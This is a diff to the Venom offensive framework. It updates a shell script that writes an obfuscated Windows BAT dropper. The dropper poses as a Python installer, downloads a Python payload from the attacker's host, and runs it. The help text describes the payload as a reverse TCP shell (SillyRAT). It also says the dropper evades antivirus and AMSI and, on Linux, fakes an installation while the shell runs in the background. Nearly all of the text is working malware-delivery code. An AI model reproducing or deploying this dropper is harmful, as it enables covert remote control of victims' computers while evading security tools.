@@ -10334,10 +10334,10 @@ if [ "$SOSP" = "Windows" ]; then
       echo "${BlueF}[☠]${white} Creating dropper BAT Program."${Reset};sleep 2
       echo ":: Framework: Venom v1.0.17 - shinigami" > $Drop.bat
       echo ":: Author: r00t-3xp10it (SSA RedTeam @2020)" >> $Drop.bat
-      echo "@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \$\$=-w 1 -C&&set \$i=py&&set '''=start" >> $Drop.bat
-      echo ",i%'$%f n%i@%ot DEF%@$%INE%@%D IS_MIN%@$%IMI%,;%ZE%i?%D se%@i%t IS_MIN%_#%IMIZ%@=i%ED=1 &%@$%& s%i0%ta%@%rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@%& ex%@$%i%_i_%t" >> $Drop.bat
-      echo "@p\"o\"%i%we^r%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
-      echo "=pow^e%@%rs^he%@%ll -e^x%@%e\"c\" b%@%y\"p\"a^s%@%s %\$\$% (Ne%@%W-Obj%@%ect N%i%et.WebCl%@%ie^n%@%t).Dow%@%nl^oa%@%dFil%@%e('h^t%@%t^p:/%@%/$lhost/$Drop.%\$i%', '$rpath\\$Drop.%\$i%') &%@%& (,;(c%@%d $rpath &%@%& py%@%t^h%@%on $Drop.%\$i%),)" >> $Drop.bat
+      echo "@echo off&%@i%&title $Drop - 3.10.5-dev Windows Installer&%#i#%&set \$\$=-w 1 -C&&set \$i=py&&set #?=." >> $Drop.bat
+      echo ",i%'$%f n%i@%ot DEF%_@$%INE%@%D IS_MIN%@$%IMI%,;%ZE%i?%D se%@i%t IS_MIN%_#%IMIZ%@=i%ED=1 &%@$%& ,s%i0%ta%@%rt \"\" /mi%@$%n \"%~dpnx0\" %* &%i@_%& ex%@$%i%_i_%t" >> $Drop.bat
+      echo "@p\"O\"%i%we^R%@%s\"h\"^e%db%ll \$C=p\"i\"%@%p sh%@%o^w t\"a\"b%@%ul^a%@%te;I%@%f(-n%@%ot(\$C)){p%@%i^p i\"n\"s%@%t^a%@%ll t\"a\"b%@%u^la%@%te py%@%n^pu%@%t p\"s\"u%@%t^i%@%l pi%@%l^l%@%o\"w\" pys%@%cr^ee%@%ns%@%h^ot p\"y\"i%@%ns^t%@%a\"l\"l%@%e^r}" >> $Drop.bat
+      echo "=pOw^e%@%rS^hE%@%lL -e^X%@%e\"C\" b%@%Y\"p\"a^S%@%s %\$\$% (nE%@%W-Obj%@%eCt N%i%Et%#?%WeBCl%@%iE^n%@%t)%#?%Dow%@%nL^oa%@%dFIl%@%E('h^t%@%t^p:/%@%/$lhost/$Drop.%\$i%', '$rpath\\$Drop.%\$i%') &%@_%& ,(,;(c%@$%d $rpath &%@%& pY%@%t^H%@%o\"N\" $Drop.%\$i%),)" >> $Drop.bat
       echo "${BlueF}[☠]${white} Written $Drop.bat (Obfuscated)"${Reset};sleep 2
 
    else
@@ -12428,10 +12428,14 @@ cat << !
     AGENT Nº   : 6
     OBFUSCATION: $obfstat <= (settings file)
     DESCRIPTION: Reverse TCP python Shell (SillyRAT)
-    OBFUSCATION: Activated or NOT, creates a BAT dropper (amsi evasion)
-                 The categorie nº3 => agent nº5 that by default creates a EXE
-                 dropper detected by AV soluctions was ported to this categorie
-                 has one obfuscated BAT dropper that bypass AV/amsi detection.
+    OBFUSCATION: Activated or NOT, (default settings for this categorie)
+
+    In-Windows : This setting obfuscates BAT dropper to evade AV/amsi detection.
+    In-Linux   : In Linux targets the dropper will fake the installation of the
+                 input FileName and at the same time executes our reverse python
+                 tcp shell in background (in a child process detach from parent).
+    In-Mac     : In Apple devices its the pure python reverse tcp python shell 
+                 that needs to be manual deliver to target and manual executed.
 
 !
 echo -n "${BlueF}[☠]${white} Press any key to return to amsi evasion .."
